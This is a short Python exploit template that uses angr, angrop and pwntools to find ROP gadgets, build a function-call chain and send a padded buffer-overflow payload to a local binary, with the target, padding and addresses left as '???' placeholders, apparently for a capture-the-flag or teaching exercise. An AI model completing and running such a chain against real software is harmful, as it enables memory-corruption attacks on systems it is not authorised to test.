import angr, angrop
import sys
from pwn import *

filename = ???

p = angr.Project(filename)
rop = p.analyses.ROP()
rop.find_gadgets()
chain = rop.func_call(???, ???) # rop.func_call(function_name, list_of_arguments)
chain.print_payload_code()
#print(chain)
print(chain.payload_str())

payload  = b'A' * ???		# padding
payload += ???			# address of RET to align the stack
payload += chain.payload_str()	# real ROP chain

q = process(filename)
q.sendline(payload)
print(q.recvall())

